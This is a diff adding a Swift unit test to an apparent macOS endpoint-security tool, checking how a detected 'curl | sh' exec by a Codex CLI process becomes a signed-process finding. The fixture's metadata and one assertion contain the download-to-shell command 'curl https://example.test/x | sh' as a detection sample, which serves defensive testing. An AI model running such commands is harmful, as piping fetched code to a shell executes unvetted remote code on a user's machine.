@@ -2,6 +2,38 @@ import XCTest
 @testable import Nick
 
 final class ExtensionXPCClientIncidentTests: XCTestCase {
+    func test_platformShellBehaviorUsesAppleSigningAndHasNoFileEvidence() throws {
+        let event = ESEvent(
+            eventType: .authExec,
+            processPath: "/Applications/ChatGPT.app/Contents/Resources/codex-cli/CodexCLI",
+            pid: 1_842,
+            parentPid: 1_060,
+            filePath: "/bin/zsh",
+            decision: .allow,
+            threat: .init(
+                threatName: "Download-to-shell command detected",
+                threatFamily: "lolbin-behavior",
+                isCodeSigned: true,
+                metadata: [
+                    "reason": "curl_pipe_shell",
+                    "rule": "curl_pipe_shell",
+                    "detectionKind": "lolbin-behavior",
+                    "signalSeverity": "critical",
+                    "execTargetPath": "/bin/zsh",
+                    "matchedCommand": "curl https://example.test/x | sh"
+                ]
+            )
+        )
+
+        let finding = try XCTUnwrap(ExtensionFinding(event: event))
+
+        XCTAssertEqual(
+            finding.signal.processInfo?.signingStatus,
+            .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh")
+        )
+        XCTAssertNil(finding.signal.fileInfo)
+        XCTAssertEqual(finding.signal.metadata["matchedCommand"], "curl https://example.test/x | sh")
+    }
 #if DEBUG
     @MainActor
     func test_debugAuthorizationHarnessReportsDisconnectedAsUnavailableNotPassed() {
